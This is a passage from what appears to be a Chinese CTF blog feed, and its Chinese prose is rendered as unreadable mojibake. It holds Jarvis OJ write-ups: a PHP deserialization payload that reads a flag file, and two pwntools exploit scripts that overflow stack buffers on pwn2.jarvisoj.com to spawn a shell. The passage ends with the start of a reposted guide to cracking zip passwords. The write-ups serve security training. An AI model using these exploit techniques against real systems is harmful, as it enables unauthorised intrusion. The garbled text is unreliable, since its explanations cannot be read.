å°±å¥½ã€‚é¦–å…ˆæŸ¥è¯¢ PHPINFO ä¸­çš„ _SERVER[â€œSCRIPT_FILENAMEâ€] å¾—åˆ°å½“å‰ç›®å½•ä¸º /opt/lampp/htdocs/ ï¼Œå°†åŸ â€˜xxxâ€™ å¤„æ”¹ä¸º:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">print_r(file_get_contents(<span class="string">"/opt/lampp/htdocs/Here_1s_7he_fl4g_buT_You_Cannot_see.php"</span>));</span><br></pre></td></tr></table></figure><p>åºåˆ—åŒ–åŠä¸€äº›å°å¤„ç†åå¾—åˆ°æœ€ç»ˆ payload ï¼š</p><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">|O:5:<span class="symbol">\"</span>OowoO<span class="symbol">\"</span>:1:&#123;s:4:<span class="symbol">\"</span>mdzz<span class="symbol">\"</span>;s:88:<span class="symbol">\"</span>print_r(file_get_contents(<span class="symbol">\"</span>/opt/lampp/htdocs/Here_1s_7he_fl4g_buT_You_Cannot_see.php<span class="symbol">\"</span>));<span class="symbol">\"</span>;&#125;</span><br></pre></td></tr></table></figure><p>ç”¨åŒæ ·çš„æ–¹å¼ POST ä¸€ä¸‹å°±å¥½äº†ã€‚</p><p><code>CTF{4d96e37f4be998c50aa586de4ada354a}</code></p><hr><h2 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h2><h3 id="XMAN-level0"><a href="#XMAN-level0" class="headerlink" title="[XMAN]level0"></a>[XMAN]level0</h3><p>é¢˜ç›®æè¿°ï¼š</p><blockquote><p>nc pwn2.jarvisoj.com 9881</p><p><a href="https://dn.jarvisoj.com/challengefiles/level0.b9ded3801d6dd36a97468e128b81a65d" target="_blank" rel="noopener">level0.b9ded3801d6dd36a97468e128b81a65d</a></p></blockquote><p> ida è½½å…¥ï¼Œå…ˆæ˜¯ main å‡½æ•°ï¼š</p><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">.text:</span><span class="number">00000000004005</span>C6 <span class="comment">; int __cdecl main(int argc, const char **argv, const char **envp)</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">00000000004005</span>C6                 public main</span><br><span class="line"><span class="symbol">.text:</span><span class="number">00000000004005</span>C6 main            proc near               <span class="comment">; DATA XREF: _start+1Dâ†‘o</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">00000000004005</span>C6</span><br><span class="line"><span class="symbol">.text:</span><span class="number">00000000004005</span>C6 var_10          = qword ptr <span class="number">-10</span>h</span><br><span class="line"><span class="symbol">.text:</span><span class="number">00000000004005</span>C6 var_4           = dword ptr <span class="number">-4</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">00000000004005</span>C6</span><br><span class="line"><span class="symbol">.text:</span><span class="number">00000000004005</span>C6 <span class="comment">; __unwind &#123;</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">00000000004005</span>C6                 <span class="keyword">push</span>    rbp</span><br><span class="line"><span class="symbol">.text:</span><span class="number">00000000004005</span>C7                 <span class="keyword">mov</span>     rbp, rsp</span><br><span class="line"><span class="symbol">.text:</span><span class="number">00000000004005</span>CA                 <span class="keyword">sub</span>     rsp, <span class="number">10</span>h</span><br><span class="line"><span class="symbol">.text:</span><span class="number">00000000004005</span>CE                 <span class="keyword">mov</span>     [rbp+var_4], edi</span><br><span class="line"><span class="symbol">.text:</span><span class="number">00000000004005</span>D1                 <span class="keyword">mov</span>     [rbp+var_10], rsi</span><br><span class="line"><span class="symbol">.text:</span><span class="number">00000000004005</span>D5                 <span class="keyword">mov</span>     edx, <span class="number">0</span>Dh        <span class="comment">; n</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">00000000004005</span>DA                 <span class="keyword">mov</span>     esi, offset aHelloWorld <span class="comment">; "Hello, World\n"</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">00000000004005</span>DF                 <span class="keyword">mov</span>     edi, <span class="number">1</span>          <span class="comment">; fd</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">00000000004005E4</span>                 <span class="keyword">call</span>    _write</span><br><span class="line"><span class="symbol">.text:</span><span class="number">00000000004005E9</span>                 <span class="keyword">mov</span>     eax, <span class="number">0</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">00000000004005</span>EE                 <span class="keyword">call</span>    vulnerable_function</span><br><span class="line"><span class="symbol">.text:</span><span class="number">00000000004005</span>F3                 leave</span><br><span class="line"><span class="symbol">.text:</span><span class="number">00000000004005</span>F4                 retn</span><br><span class="line"><span class="symbol">.text:</span><span class="number">00000000004005</span>F4 <span class="comment">; &#125; // starts at 4005C6</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">00000000004005</span>F4 main            endp</span><br></pre></td></tr></table></figure><p>vulnerable_function å‡½æ•°ï¼š</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">.text:</span>00000000004005A6                 <span class="meta">public</span> vulnerable_function</span><br><span class="line"><span class="symbol">.text:</span>00000000004005A6 vulnerable_function proc <span class="built_in">near</span>           <span class="comment">; CODE XREF: main+28â†“p</span></span><br><span class="line"><span class="symbol">.text:</span>00000000004005A6</span><br><span class="line"><span class="symbol">.text:</span>00000000004005A6 buf             = <span class="built_in">byte</span> <span class="built_in">ptr</span> -<span class="number">80h</span></span><br><span class="line"><span class="symbol">.text:</span>00000000004005A6</span><br><span class="line"><span class="symbol">.text:</span>00000000004005A6 <span class="comment">; __unwind &#123;</span></span><br><span class="line"><span class="symbol">.text:</span>00000000004005A6                 <span class="keyword">push</span>    <span class="built_in">rbp</span></span><br><span class="line"><span class="symbol">.text:</span>00000000004005A7                 <span class="keyword">mov</span>     <span class="built_in">rbp</span>, <span class="built_in">rsp</span></span><br><span class="line"><span class="symbol">.text:</span>00000000004005AA                 <span class="keyword">add</span>     <span class="built_in">rsp</span>, <span class="number">0FFFFFFFFFFFFFF80h</span></span><br><span class="line"><span class="symbol">.text:</span>00000000004005AE                 <span class="keyword">lea</span>     <span class="built_in">rax</span>, [<span class="built_in">rbp</span>+buf]</span><br><span class="line"><span class="symbol">.text:</span>00000000004005B2                 <span class="keyword">mov</span>     <span class="built_in">edx</span>, <span class="number">200h</span>       <span class="comment">; nbytes</span></span><br><span class="line"><span class="symbol">.text:</span>00000000004005B7                 <span class="keyword">mov</span>     <span class="built_in">rsi</span>, <span class="built_in">rax</span>        <span class="comment">; buf</span></span><br><span class="line"><span class="symbol">.text:</span>00000000004005BA                 <span class="keyword">mov</span>     <span class="built_in">edi</span>, <span class="number">0</span>          <span class="comment">; fd</span></span><br><span class="line"><span class="symbol">.text:</span>00000000004005BF                 <span class="keyword">call</span>    _read</span><br><span class="line"><span class="symbol">.text:</span>00000000004005C4                 <span class="keyword">leave</span></span><br><span class="line"><span class="symbol">.text:</span>00000000004005C5                 <span class="keyword">retn</span></span><br><span class="line"><span class="symbol">.text:</span>00000000004005C5 <span class="comment">; &#125; // starts at 4005A6</span></span><br><span class="line"><span class="symbol">.text:</span>00000000004005C5 vulnerable_function endp</span><br></pre></td></tr></table></figure><p>ä»¥åŠä¸€ä¸ªæœªæ›¾è¢«è°ƒç”¨ä½†æ˜¯èƒ½å¤Ÿæ‰“å¼€ shell çš„ callsystem å‡½æ•°ï¼š</p><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">.text:</span><span class="number">0000000000400596</span>                 public callsystem</span><br><span class="line"><span class="symbol">.text:</span><span class="number">0000000000400596</span> callsystem      proc near</span><br><span class="line"><span class="symbol">.text:</span><span class="number">0000000000400596</span> <span class="comment">; __unwind &#123;</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">0000000000400596</span>                 <span class="keyword">push</span>    rbp</span><br><span class="line"><span class="symbol">.text:</span><span class="number">0000000000400597</span>                 <span class="keyword">mov</span>     rbp, rsp</span><br><span class="line"><span class="symbol">.text:</span><span class="number">000000000040059</span>A                 <span class="keyword">mov</span>     edi, offset command <span class="comment">; "/bin/sh"</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">000000000040059</span>F                 <span class="keyword">call</span>    _system</span><br><span class="line"><span class="symbol">.text:</span><span class="number">00000000004005</span>A4                 <span class="keyword">pop</span>     rbp</span><br><span class="line"><span class="symbol">.text:</span><span class="number">00000000004005</span>A5                 retn</span><br><span class="line"><span class="symbol">.text:</span><span class="number">00000000004005</span>A5 <span class="comment">; &#125; // starts at 400596</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">00000000004005</span>A5 callsystem      endp</span><br></pre></td></tr></table></figure><p>å¯ä»¥åˆ©ç”¨ vulnerable_function ä¸­çš„ read å‡½æ•°è¿›è¡Œç¼“å†²åŒºæº¢å‡ºï¼Œè¿›è€Œè·³è½¬åˆ° callsystem å‡½æ•°ä»¥ get shell ã€‚</p><p>ctrl + k æŸ¥çœ‹è¯¥å‡½æ•°çš„æ ˆå¸§ï¼Œbuf çš„é¦–åœ°å€ä¸æ ˆè¿”å›åœ°å€çš„è·ç¦»å·®ä¸º (+0000000000000008) - (-0000000000000080) ï¼Œå³ 0x88 ï¼Œcallsystem å‡½æ•°çš„åœ°å€ä¸º 0x400596 ï¼Œæ¥ä¸‹æ¥å°±å¯ä»¥å†™ poc äº†ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh = remote(<span class="string">'pwn2.jarvisoj.com'</span>, <span class="number">9881</span>)</span><br><span class="line"></span><br><span class="line">padding = <span class="string">'A'</span> * <span class="number">0x88</span></span><br><span class="line">add = p64(<span class="number">0x400596</span>)</span><br><span class="line">payload = padding + add</span><br><span class="line">sh.send(payload)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><p>cat flagï¼š</p><p><code>CTF{713ca3944e92180e0ef03171981dcd41}</code></p><h3 id="XMAN-level1"><a href="#XMAN-level1" class="headerlink" title="[XMAN]level1"></a>[XMAN]level1</h3><p>é¢˜ç›®æè¿°ï¼š</p><blockquote><p>nc pwn2.jarvisoj.com 9877</p><p><a href="https://dn.jarvisoj.com/challengefiles/level1.80eacdcd51aca92af7749d96efad7fb5" target="_blank" rel="noopener">level1.80eacdcd51aca92af7749d96efad7fb5</a></p></blockquote><p>checksec ä¸€ä¸‹å‘ç°ä»€ä¹ˆä¿æŠ¤éƒ½æ²¡æœ‰å¼€ï¼Œè¿™æ¬¡æ˜¯ä¸€ä¸ª 32 ä½çš„ç¨‹åºï¼Œida è½½å…¥ä¹‹ï¼š</p><p>main å‡½æ•°ï¼š</p><figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">.text:<span class="number">080484B7</span> ; int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">.text:<span class="number">080484B7</span>                 public main</span><br><span class="line">.text:<span class="number">080484B7</span> main            proc near               ; DATA XREF: _start+<span class="number">17</span>â†‘o</span><br><span class="line">.text:<span class="number">080484B7</span></span><br><span class="line">.text:<span class="number">080484B7</span> var_4           = dword ptr -<span class="number">4</span></span><br><span class="line">.text:<span class="number">080484B7</span> argc            = dword ptr  <span class="number">8</span></span><br><span class="line">.text:<span class="number">080484B7</span> argv            = dword ptr  <span class="number">0Ch</span></span><br><span class="line">.text:<span class="number">080484B7</span> envp            = dword ptr  10h</span><br><span class="line">.text:<span class="number">080484B7</span></span><br><span class="line">.text:<span class="number">080484B7</span> ; __unwind &#123;</span><br><span class="line">.text:<span class="number">080484B7</span>                 lea     ecx, [esp+<span class="number">4</span>]</span><br><span class="line">.text:<span class="number">080484BB</span>                 <span class="keyword">and</span>     esp, <span class="number">0FFFFFFF0h</span></span><br><span class="line">.text:<span class="number">080484BE</span>                 <span class="built_in">push</span>    dword ptr [ecx-<span class="number">4</span>]</span><br><span class="line">.text:<span class="number">080484C1</span>                 <span class="built_in">push</span>    ebp</span><br><span class="line">.text:<span class="number">080484C2</span>                 mov     ebp, esp</span><br><span class="line">.text:<span class="number">080484C4</span>                 <span class="built_in">push</span>    ecx</span><br><span class="line">.text:<span class="number">080484C5</span>                 sub     esp, <span class="number">4</span></span><br><span class="line">.text:<span class="number">080484C8</span>                 call    vulnerable_function</span><br><span class="line">.text:<span class="number">080484CD</span>                 sub     esp, <span class="number">4</span></span><br><span class="line">.text:<span class="number">080484D0</span>                 <span class="built_in">push</span>    <span class="number">0Eh</span>             ; n</span><br><span class="line">.text:<span class="number">080484D2</span>                 <span class="built_in">push</span>    offset aHelloWorld ; <span class="string">"Hello, World!\n"</span></span><br><span class="line">.text:<span class="number">080484D7</span>                 <span class="built_in">push</span>    <span class="number">1</span>               ; fd</span><br><span class="line">.text:<span class="number">080484D9</span>                 call    _write</span><br><span class="line">.text:<span class="number">080484DE</span>                 add     esp, 10h</span><br><span class="line">.text:<span class="number">080484E1</span>                 mov     eax, <span class="number">0</span></span><br><span class="line">.text:<span class="number">080484E6</span>                 mov     ecx, [ebp+var_4]</span><br><span class="line">.text:<span class="number">080484E9</span>                 leave</span><br><span class="line">.text:<span class="number">080484EA</span>                 lea     esp, [ecx-<span class="number">4</span>]</span><br><span class="line">.text:<span class="number">080484ED</span>                 retn</span><br><span class="line">.text:<span class="number">080484ED</span> ; &#125; // starts <span class="built_in">at</span> <span class="number">80484B7</span></span><br><span class="line">.text:<span class="number">080484ED</span> main            endp</span><br></pre></td></tr></table></figure><p>åœ¨è°ƒç”¨ vulnerable_function å‡½æ•°ä¹‹å printf â€œHello, World!\nâ€ã€‚</p><p>çœ‹ä¸€ä¸‹ vulnerable_function å‡½æ•°ï¼š</p><figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">.text:<span class="number">0804847B</span>                 public vulnerable_function</span><br><span class="line">.text:<span class="number">0804847B</span> vulnerable_function proc near           ; CODE XREF: main+<span class="number">11</span>â†“p</span><br><span class="line">.text:<span class="number">0804847B</span></span><br><span class="line">.text:<span class="number">0804847B</span> buf             = byte ptr -88h</span><br><span class="line">.text:<span class="number">0804847B</span></span><br><span class="line">.text:<span class="number">0804847B</span> ; __unwind &#123;</span><br><span class="line">.text:<span class="number">0804847B</span>                 <span class="built_in">push</span>    ebp</span><br><span class="line">.text:<span class="number">0804847C</span>                 mov     ebp, esp</span><br><span class="line">.text:<span class="number">0804847E</span>                 sub     esp, 88h</span><br><span class="line">.text:<span class="number">08048484</span>                 sub     esp, <span class="number">8</span></span><br><span class="line">.text:<span class="number">08048487</span>                 lea     eax, [ebp+buf]</span><br><span class="line">.text:<span class="number">0804848D</span>                 <span class="built_in">push</span>    eax</span><br><span class="line">.text:<span class="number">0804848E</span>                 <span class="built_in">push</span>    offset format   ; <span class="string">"What's this:%p?\n"</span></span><br><span class="line">.text:<span class="number">08048493</span>                 call    _printf</span><br><span class="line">.text:<span class="number">08048498</span>                 add     esp, 10h</span><br><span class="line">.text:<span class="number">0804849B</span>                 sub     esp, <span class="number">4</span></span><br><span class="line">.text:<span class="number">0804849E</span>                 <span class="built_in">push</span>    100h            ; nbytes</span><br><span class="line">.text:<span class="number">080484A3</span>                 lea     eax, [ebp+buf]</span><br><span class="line">.text:<span class="number">080484A9</span>                 <span class="built_in">push</span>    eax             ; buf</span><br><span class="line">.text:<span class="number">080484AA</span>                 <span class="built_in">push</span>    <span class="number">0</span>               ; fd</span><br><span class="line">.text:<span class="number">080484AC</span>                 call    _read</span><br><span class="line">.text:<span class="number">080484B1</span>                 add     esp, 10h</span><br><span class="line">.text:<span class="number">080484B4</span>                 nop</span><br><span class="line">.text:<span class="number">080484B5</span>                 leave</span><br><span class="line">.text:<span class="number">080484B6</span>                 retn</span><br><span class="line">.text:<span class="number">080484B6</span> ; &#125; // starts <span class="built_in">at</span> 804847B</span><br><span class="line">.text:<span class="number">080484B6</span> vulnerable_function endp</span><br></pre></td></tr></table></figure><p>è¿™ä¸ªå‡½æ•°é¦–å…ˆæ‰“å°å‡º buf çš„é¦–åœ°å€ï¼Œç„¶åä»æ ‡å‡†è¾“å…¥è·å– 100 å­—èŠ‚å†™å…¥ buf ä¸­ã€‚buf çš„é•¿åº¦ä¸º 0x04 - (-0x88) = 0x8c &lt; 0x100 ï¼Œåˆå› ä¸ºæ²¡æœ‰å¼€å¯æ ˆä¿æŠ¤ï¼Œä¼šé€ æˆæ ˆæº¢å‡ºã€‚</p><p>è¿™æ ·å¤§è‡´çš„æ€è·¯å°±æœ‰äº†ã€‚å…ˆæˆªå– buf çš„é¦–åœ°å€ï¼Œåœ¨å…¶ä¸­å†™å…¥æ‹¿ shell çš„ shellcode ï¼Œå†ç”¨ buf åœ°å€è¦†ç›– vulnerable_function å‡½æ•°çš„è¿”å›åœ°å€ä½¿ä¹‹æ‰§è¡Œ system(â€œ/bin/shâ€) ã€‚ä¸è¿‡æˆ‘ä»¬ä¸çŸ¥é“ system çš„åœ°å€ï¼Œæ­¤æ—¶å¯ä»¥ç”¨ pwntools ä¸­çš„ asm() å‡½æ•°ã€‚</p><p>asm() å‡½æ•°å¯ä»¥æ¥æ”¶ä¸€ä¸ªå­—ç¬¦ä¸²ä½œä¸ºå‚æ•°ï¼Œå¾—åˆ°æ±‡ç¼–ç çš„æœºå™¨ä»£ç ã€‚ è¿™é‡Œæˆ‘ä»¬å¯ä»¥ç”¨ asm(shellcraft.sh()) çš„æ–¹å¼å¾—åˆ°ç›®æ ‡åœ°å€ï¼Œshellcraft.sh() å°±æ˜¯æ‰§è¡Œ /bin/sh çš„ shellcodeã€‚</p><p>æŒ‰ç…§ shellcode + nope*n + ret_address è¿™ä¸ªæ ¼å¼å°±å¯ä»¥æ‹¿åˆ° shell äº†ã€‚</p><p>poc: </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh = remote(<span class="string">'pwn2.jarvisoj.com'</span>, <span class="number">9877</span>)</span><br><span class="line">shellcode = asm(shellcraft.sh()) </span><br><span class="line">p_buf = int(sh.recvline()[<span class="number">14</span>:<span class="number">-2</span>], <span class="number">16</span>)</span><br><span class="line"><span class="comment">#print (hex(p_buf))</span></span><br><span class="line"></span><br><span class="line">payload = shellcode + (<span class="number">0x8c</span>-len(shellcode)) * <span class="string">'\x90'</span> + p32(p_buf)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><p>cat flag:  </p><p><code>CTF{82c2aa534a9dede9c3a0045d0fec8617}</code></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;è®°å½•ä¸€äº› Jarvis OJ ä¸Šçš„é¢˜ã€‚&lt;/p&gt;
&lt;p&gt;å¹³å°åœ°å€ï¼š&lt;a href=&quot;https://www.jarvisoj.com/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://www.jarvisoj.com/&lt;/a&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="CTF" scheme="https://cyris.pen.moe/categories/CTF/"/>
    
    
      <category term="CTF" scheme="https://cyris.pen.moe/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>ç»™ä½ å‹ç¼©åŒ…å´ä¸ç»™ä½ å¯†ç çš„äººåˆ°åº•åœ¨æƒ³ä»€ä¹ˆ</title>
    <link href="https://cyris.pen.moe/posts/rar-attack/"/>
    <id>https://cyris.pen.moe/posts/rar-attack/</id>
    <published>2017-10-19T06:58:50.000Z</published>
    <updated>2018-04-01T06:35:58.000Z</updated>
    
    <content type="html"><![CDATA[<p>çº¯è½¬è½½ã€‚åŸå¸–æˆ³è¿™é‡Œï¼š<a href="http://veritas501.space/2017/06/23/%E7%BB%99%E4%BD%A0%E5%8E%8B%E7%BC%A9%E5%8C%85%E5%8D%B4%E4%B8%8D%E7%BB%99%E4%BD%A0%E5%AF%86%E7%A0%81%E7%9A%84%E4%BA%BA%E5%88%B0%E5%BA%95%E5%9C%A8%E6%83%B3%E4%BB%80%E4%B9%88/" target="_blank" rel="noopener">veritas501 - ç»™ä½ å‹ç¼©åŒ…å´ä¸ç»™ä½ å¯†ç çš„äººåˆ°åº•åœ¨æƒ³ä»€ä¹ˆ</a></p><a id="more"></a><h2 id="0x00-å¼€å§‹"><a href="#0x00-å¼€å§‹" class="headerlink" title="0x00 å¼€å§‹"></a>0x00 å¼€å§‹</h2><p>åœ¨è¿™é‡Œï¼Œæˆ‘å»ºè®®å¤§å®¶è£…ä¸¤ä¸ªè§£å‹è½¯ä»¶ï¼Œä¸€ä¸ªéšæ„ï¼ˆæˆ‘ç”¨çš„7zï¼‰ï¼Œä¸€ä¸ªæ˜¯winrarã€‚   </p><p>å«Œå³é”®èœå•æŒ¤ä½ å°±è£…è™šæ‹Ÿæœºé‡Œå‘—ã€‚  </p><p>å› ä¸ºè¿™ä¸¤ä¸ªå‹ç¼©è½¯ä»¶å‹ç¼©å‡ºæ¥çš„zipæ€»æ˜¯æœ‰ç‚¹ä¸åŒï¼Œæœ€æ˜æ˜¾çš„ä¸€ç‚¹ï¼Œå°±æ˜¯åœ¨å·²çŸ¥æ˜æ–‡æ”»å‡»ï¼ˆåé¢ä¼šè¯´ï¼‰çš„æ—¶å€™ï¼Œä¸¤ç§è½¯ä»¶å‹ç¼©å‡ºæ¥çš„å‹ç¼©åŒ…åœ¨æ„é€ æ˜æ–‡å‹ç¼©åŒ…çš„æ—¶å€™ä¸èƒ½äº’ç”¨ã€‚    </p><h2 id="0x01-æ³¨é‡Š"><a href="#0x01-æ³¨é‡Š" class="headerlink" title="0x01 æ³¨é‡Š"></a>0x01 æ³¨é‡Š</h2><p><strong>æ‹¿åˆ°å‹ç¼©åŒ…ä¸Šæ¥ä¸€å®šè¦çœ‹æœ‰æ²¡æœ‰æ³¨é‡Šï¼Œä¸€å®šè¦çœ‹æœ‰æ²¡æœ‰æ³¨é‡Šï¼Œä¸€å®šè¦çœ‹æœ‰æ²¡æœ‰æ³¨é‡Šï¼Œé‡è¦çš„è¯è¯´ä¸‰éã€‚</strong></p><p>æœ‰çš„æ—¶å€™ä»–çœŸçš„æ˜¯æƒ³é€ä½ åˆ†ï¼ŒæŠŠå¯†ç æˆ–æ˜¯hintå†™åœ¨æ³¨é‡Šé‡Œï¼Œä½†ä½ å°±æ˜¯ä¸å»çœ‹ä»–ä¸€çœ¼ã€‚  </p><p>ç”¨hexæ–¹å¼æ‰“å¼€çš„æ‰“ä¸€èˆ¬åœ¨æœ«å°¾  </p><p><img src="/posts/rar-attack/1.png" alt=""></p><p>ä¸­æ–‡æ³¨é‡Šçš„è¯è¿™æ ·å¯èƒ½ä¼šä¹±ç ã€‚å»ºè®®å‹ç¼©è½¯ä»¶æ‰“å¼€  </p><p><img src="/posts/rar-attack/2.png" alt=""></p><h2 id="0x02-å¼±å¯†ç "><a href="#0x02-å¼±å¯†ç " class="headerlink" title="0x02 å¼±å¯†ç "></a>0x02 å¼±å¯†ç </h2><p>è¿™ä¸ªå…¶å®çœŸçš„æ²¡ä»€ä¹ˆå¥½è¯´çš„ï¼Œ<strong>ä¸Šæ¥åº”è¯¥å…ˆè¯•ä¸€è¯•çš„</strong>ï¼Œå› ä¸ºä¹Ÿä¸ç”¨åŠ¨è„‘å­ï¼Œç›´æ¥æ”¾åå°è·‘å°±è¡Œäº†ã€‚   </p><p>é¦–å…ˆå…ˆè·‘çº¯æ•°å­—å¯†ç ï¼Œ1åˆ°9ä½ç›´æ¥è·‘ä¸€éï¼Œä¹Ÿå°±1åˆ†é’Ÿå·¦å³çš„æ—¶é—´å§ã€‚  </p><p>ä¸å¯¹çš„è¯å¯ä»¥ä¸Šå­—å…¸ï¼Œæˆ–æ˜¯çŸ­å¯†ç ç©·ä¸¾ä¸€ä¸‹ï¼Œç›´æ¥ä¸¢åå°å°±è¡Œï¼Œäººè„‘å¯ä»¥å†åšå…¶ä»–çš„æ–¹å‘çš„åˆ†æã€‚   </p><p>å¦å¤–ï¼Œå¦‚æœè·‘å­—å…¸éƒ½è·‘ä¸åˆ°çš„è¯ï¼Œå¯ä»¥è¯•è¯•æ­¤æ¬¡CTFçš„åå­—ï¼Œæˆ–æ˜¯è¿™ä¸ªé¢˜ç›®çš„åå­—ã€‚   </p><p>è½¯ä»¶ç”¨<code>archpr</code>ï¼Œç½‘ä¸Šç›´æ¥ä¸‹å°±è¡Œï¼Œè¿™é‡Œå°±ä¸åˆ†äº«äº†ã€‚   </p><p><img src="/posts/rar-attack/3.png" alt=""></p><p><img src="/posts/rar-attack/4.png" alt=""></p><h2 id="0x03-å‹ç¼©åŒ…ä¼ªåŠ å¯†"><a href="#0x03-å‹ç¼©åŒ…ä¼ªåŠ å¯†" class="headerlink" title="0x03 å‹ç¼©åŒ…ä¼ªåŠ å¯†"></a>0x03 å‹ç¼©åŒ…ä¼ªåŠ å¯†</h2><p>ä¸€ä¸ªä¼ªåŠ å¯†çš„å‹ç¼©åŒ…å†’å……åŠ å¯†å‹ç¼©åŒ…ï¼Œä½ è¦çŸ¥é“å‹ç¼©è½¯ä»¶æ˜¯å¦‚ä½•è¯†åˆ«ä¸€ä¸ªå‹ç¼©åŒ…æ˜¯å¦è¢«åŠ å¯†çš„ã€‚</p><p>è½¯ä»¶ä¸»è¦æ˜¯å›´ç»•frFlagså’ŒdeFlagsæ¥åˆ¤æ–­çš„ã€‚</p><p>æˆ‘ä»¬ç”¨winraråˆ›å»ºä¸€ä¸ªåŠ å¯†çš„å‹ç¼©åŒ…ï¼Œå¯ä»¥çœ‹åˆ°åŠ å¯†çš„å‹ç¼©åŒ…çš„frFlagså’ŒdeFlagséƒ½ä¸º9ã€‚</p><p>å…¶ä¸­ï¼ŒdeFlagsæ˜¯é’ˆå¯¹å•ä¸ªæ–‡ä»¶çš„ï¼Œå‹ç¼©åŒ…ä¸­çš„æ¯ä¸ªæ–‡ä»¶éƒ½æœ‰ã€‚  </p><p><img src="/posts/rar-attack/5.png" alt=""></p><p><img src="/posts/rar-attack/6.png" alt=""></p><p>è€ŒæœªåŠ å¯†çš„éƒ½ä¸º0ã€‚</p><p>ç”¨7zåˆ›å»ºä¸€ä¸ªåŠ å¯†çš„å‹ç¼©åŒ…ï¼ŒfrFlagså’ŒdeFlagséƒ½ä¸º1ã€‚è¿™é‡Œå°±ä¸å¤šæ”¾å›¾äº†ã€‚</p><p>è€ŒæœªåŠ å¯†çš„ä¾ç„¶éƒ½ä¸º0ã€‚</p><p>ç»¼ä¸Šï¼Œå¤§å®¶åº”è¯¥å·²ç»çŸ¥é“æ€ä¹ˆæ”¹æ 